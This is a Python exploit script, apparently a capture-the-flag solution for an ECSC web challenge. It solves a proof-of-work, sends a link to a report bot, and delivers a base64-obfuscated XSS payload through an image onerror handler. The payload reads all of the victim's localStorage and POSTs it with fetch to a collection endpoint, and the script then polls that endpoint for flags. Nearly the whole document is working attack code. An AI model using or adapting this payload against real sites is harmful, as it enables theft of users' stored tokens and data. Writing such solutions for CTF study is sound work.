#!/usr/bin/env python3

import re
import sys
import time
import requests
from os import urandom
from hashlib import sha256
from base64 import b64encode, b64decode

FLAG_REGEX = 'ECSC_.{32}'

report_url = ''
service_url = ''

def crack(salt, suffix):
    seq = b''
    while not sha256(salt + seq).digest().endswith(suffix):
        seq = urandom(8)
    return b64encode(seq)


def send_link(message):
    '''
    Sends a link and returns the UUID.
    '''
    s = requests.Session()
    r = s.get(report_url)
    
    b64salt = re.findall('salt \(b64-encoded\) <code>(.*?)</code>', r.text)[0]
    b64suffix = re.findall('suffix \(b64-encoded\) <code>(.*?)</code>', r.text)[0]
    salt = b64decode(b64salt)
    suffix = b64decode(b64suffix)
    
    
    print(f'Cracking {salt}, {suffix}')
    seq = crack(salt, suffix)
    print(f'Cracking done {seq}')

    r = s.post(report_url, data={'pow': seq, 'link': message})
    try:
        link_uuid = re.findall('<a href="/report/(.*?)">here', r.text)[0]
    except Exception as e:
        print(r.text)
        raise e

    return link_uuid


def check_messages(link_uuid):
    '''
    Returns the messages sent to the given link UUID.
    '''
    r = requests.get(f'{report_url}/report/{link_uuid}')
    return r.text


def get_payload(link_uuid):
    '''
    Returns the link containing the payload.
    '''
    payload = '''
        var out = ""
        for(const key in localStorage) {
            out += atob(localStorage.getItem(key));
        }
        fetch("%s/report/%s", {
        "headers": {
            "content-type": "application/x-www-form-urlencoded",
        },
        "body": "message=" + encodeURIComponent(out),
        "method": "POST",
        "mode": "no-cors"
        });''' % (report_url, link_uuid)
    b64payload = b64encode(payload.encode()).decode()
    return '{}/analyze#{}@'.format(
        service_url,
        b64encode(f'<img src=asdad onerror=eval(atob("{b64payload}"))>'.encode()).decode()
    )


def main():
    global report_url, service_url

    ip = sys.argv[1]
    report_url  = f'http://{ip}:11111'
    service_url = f'http://{ip}:10010'

    # not sending any exploit here, just a placeholder to append flags later
    link_uuid = send_link(service_url)
    print(f'Observing {link_uuid}')

    send_link(get_payload(link_uuid))

    while True:
        t = check_messages(link_uuid)
        flags = re.findall(FLAG_REGEX, t)
        if flags:
            print(flags)
            break
        time.sleep(5)
    

if __name__ == '__main__':
    main()
